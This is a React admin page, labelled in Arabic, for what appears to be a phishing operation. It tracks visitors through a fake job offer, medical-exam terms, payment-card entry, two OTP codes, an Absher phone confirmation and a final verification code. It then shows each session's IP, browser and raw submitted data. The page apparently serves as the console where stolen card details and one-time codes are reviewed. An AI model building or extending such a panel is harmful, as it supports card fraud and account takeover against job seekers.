import DashboardLayout from "@/components/DashboardLayout";
import { AdminGuard } from "@/components/AdminGuard";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import {
  Table, TableBody, TableCell, TableHead, TableHeader, TableRow,
} from "@/components/ui/table";
import { trpc } from "@/lib/trpc";
import { useMemo, useState } from "react";
import {
  BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip,
  ResponsiveContainer, Cell,
} from "recharts";
import { Activity, Eye, Search, TrendingUp } from "lucide-react";
import { format } from "date-fns";

const STEP_LABELS: Record<string, string> = {
  salary_view: "عرض صفحة العرض الوظيفي",
  salary_accept: "قبول العرض",
  ypti: "إجابات شروط الفحص الطبي",
  data: "بيانات الدفع الأولية",
  cardpayment: "إدخال بيانات البطاقة",
  cardpayment_retry: "إعادة محاولة الدفع",
  code_pay: "رمز التحقق الأول OTP",
  pay_code: "رمز التحقق الثاني OTP",
  number: "تأكيد رقم الجوال (أبشر)",
  n_code: "رمز التحقق النهائي",
};

const STEP_COLORS = [
  "#f97316", "#ea580c", "#f59e0b",
  "#10b981", "#059669", "#0ea5e9",
  "#3b82f6", "#6366f1", "#8b5cf6", "#ef4444",
];

function StepLabel({ stepKey }: { stepKey: string }) {
  return (
    <Badge variant="secondary" className="font-mono text-xs">
      {STEP_LABELS[stepKey] || stepKey}
    </Badge>
  );
}

export default function AdminFunnel() {
  const [stepFilter, setStepFilter] = useState<string>("all");
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<any | null>(null);

  const queryInput = useMemo(
    () => ({ stepKey: stepFilter === "all" ? undefined : stepFilter, limit: 500 }),
    [stepFilter]
  );

  const { data: steps = [], isLoading } = trpc.steps.listAll.useQuery(queryInput);
  const { data: stats } = trpc.steps.stats.useQuery();

  const filtered = useMemo(() => {
    if (!search.trim()) return steps;
    const q = search.toLowerCase();
    return steps.filter((s: any) =>
      s.sessionId?.toLowerCase().includes(q) ||
      s.ipAddress?.toLowerCase().includes(q) ||
      s.data?.toLowerCase().includes(q)
    );
  }, [steps, search]);

  const chartData = useMemo(() => {
    const order = Object.keys(STEP_LABELS);
    const map = new Map((stats?.byStepKey || []).map(s => [s.stepKey, s.count]));
    return order.map(k => ({
      step: STEP_LABELS[k]?.slice(0, 20) || k,
      key: k,
      count: map.get(k) || 0,
    }));
  }, [stats]);

  const totalEvents = (stats?.byStepKey || []).reduce((s, x) => s + x.count, 0);
  const uniqueSessions = new Set(steps.map((s: any) => s.sessionId)).size;

  return (
    <AdminGuard>
      <DashboardLayout>
        <div className="p-4 md:p-8 space-y-6 max-w-7xl">
          <header>
            <h1 className="text-2xl md:text-3xl font-extrabold text-gray-900">
              تتبع الزوار وقمع التحويل (Funnel)
            </h1>
            <p className="text-sm text-muted-foreground mt-1">
              راقب تقدم الزوار عبر جميع خطوات التقديم وحدد أين يتوقفون.
            </p>
          </header>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <Card className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">إجمالي الأحداث</p>
                  <p className="text-3xl font-extrabold text-gray-900 mt-1">{totalEvents}</p>
                </div>
                <Activity className="w-8 h-8 text-orange-500" />
              </div>
            </Card>
            <Card className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">جلسات فريدة</p>
                  <p className="text-3xl font-extrabold text-gray-900 mt-1">{uniqueSessions}</p>
                </div>
                <TrendingUp className="w-8 h-8 text-emerald-500" />
              </div>
            </Card>
            <Card className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">عدد الخطوات النشطة</p>
                  <p className="text-3xl font-extrabold text-gray-900 mt-1">
                    {(stats?.byStepKey || []).length}
                  </p>
                </div>
                <Eye className="w-8 h-8 text-blue-500" />
              </div>
            </Card>
          </div>

          <Card className="p-5">
            <h2 className="font-bold text-gray-900 mb-4">قمع الخطوات</h2>
            <ResponsiveContainer width="100%" height={320}>
              <BarChart data={chartData} margin={{ top: 5, right: 10, left: 0, bottom: 60 }}>
                <CartesianGrid strokeDasharray="3 3" opacity={0.3} />
                <XAxis dataKey="step" angle={-25} textAnchor="end" interval={0} height={70} fontSize={11} />
                <YAxis allowDecimals={false} />
                <Tooltip />
                <Bar dataKey="count" radius={[6, 6, 0, 0]}>
                  {chartData.map((_, i) => (
                    <Cell key={i} fill={STEP_COLORS[i % STEP_COLORS.length]} />
                  ))}
                </Bar>
              </BarChart>
            </ResponsiveContainer>
          </Card>

          <Card className="p-5">
            <div className="flex flex-col md:flex-row gap-3 md:items-center md:justify-between mb-4">
              <h2 className="font-bold text-gray-900">سجل الأحداث ({filtered.length})</h2>
              <div className="flex gap-2 flex-wrap">
                <div className="relative">
                  <Search className="w-4 h-4 absolute right-2.5 top-1/2 -translate-y-1/2 text-gray-400" />
                  <Input
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    placeholder="بحث..."
                    className="pr-9 w-56"
                  />
                </div>
                <Select value={stepFilter} onValueChange={setStepFilter}>
                  <SelectTrigger className="w-56">
                    <SelectValue placeholder="جميع الخطوات" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">جميع الخطوات</SelectItem>
                    {Object.entries(STEP_LABELS).map(([k, v]) => (
                      <SelectItem key={k} value={k}>{v}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="overflow-x-auto rounded-lg border">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>التاريخ</TableHead>
                    <TableHead>الخطوة</TableHead>
                    <TableHead>الجلسة</TableHead>
                    <TableHead>IP</TableHead>
                    <TableHead>المتصفح</TableHead>
                    <TableHead className="text-left">إجراء</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {isLoading && (
                    <TableRow><TableCell colSpan={6} className="text-center py-8 text-muted-foreground">جاري التحميل...</TableCell></TableRow>
                  )}
                  {!isLoading && filtered.length === 0 && (
                    <TableRow><TableCell colSpan={6} className="text-center py-8 text-muted-foreground">لا توجد أحداث</TableCell></TableRow>
                  )}
                  {filtered.map((s: any) => (
                    <TableRow key={s.id} className="hover:bg-orange-50/40">
                      <TableCell className="text-xs whitespace-nowrap">
                        {format(new Date(s.createdAt), "yyyy/MM/dd HH:mm:ss")}
                      </TableCell>
                      <TableCell><StepLabel stepKey={s.stepKey} /></TableCell>
                      <TableCell className="font-mono text-xs">{s.sessionId?.slice(0, 16)}…</TableCell>
                      <TableCell className="font-mono text-xs">{s.ipAddress || "—"}</TableCell>
                      <TableCell className="text-xs max-w-[200px] truncate">{s.userAgent || "—"}</TableCell>
                      <TableCell>
                        <Button variant="ghost" size="sm" onClick={() => setSelected(s)}>
                          <Eye className="w-4 h-4 ml-1" /> عرض
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          </Card>

          {/* مودال التفاصيل */}
          <Dialog open={!!selected} onOpenChange={(open) => !open && setSelected(null)}>
            <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto">
              <DialogHeader>
                <DialogTitle>تفاصيل الحدث</DialogTitle>
              </DialogHeader>
              {selected && (
                <div className="space-y-3 text-sm">
                  <div className="grid grid-cols-2 gap-3">
                    <div><span className="font-bold">الخطوة:</span> {STEP_LABELS[selected.stepKey] || selected.stepKey}</div>
                    <div><span className="font-bold">التاريخ:</span> {format(new Date(selected.createdAt), "yyyy/MM/dd HH:mm:ss")}</div>
                    <div className="col-span-2"><span className="font-bold">الجلسة:</span> <span className="font-mono text-xs">{selected.sessionId}</span></div>
                    <div><span className="font-bold">IP:</span> {selected.ipAddress || "—"}</div>
                  </div>
                  <div>
                    <p className="font-bold mb-1">البيانات المُرسلة:</p>
                    <pre className="bg-gray-100 p-3 rounded-lg text-xs overflow-x-auto" dir="ltr">
{JSON.stringify(JSON.parse(selected.data || "{}"), null, 2)}
                    </pre>
                  </div>
                  {selected.userAgent && (
                    <div>
                      <p className="font-bold mb-1">المتصفح:</p>
                      <p className="text-xs text-muted-foreground break-all">{selected.userAgent}</p>
                    </div>
                  )}
                </div>
              )}
            </DialogContent>
          </Dialog>
        </div>
      </DashboardLayout>
    </AdminGuard>
  );
}
